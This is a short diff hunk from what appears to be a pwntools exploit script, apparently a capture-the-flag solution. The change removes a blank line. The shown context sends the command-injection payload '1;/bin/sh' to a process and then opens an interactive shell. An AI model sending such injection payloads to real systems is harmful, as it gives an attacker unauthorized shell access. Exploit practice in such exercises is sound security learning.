@@ -46,5 +46,4 @@ for i in range(6):
     
 p.sendline("1;/bin/sh")
 
-
 p.interactive()
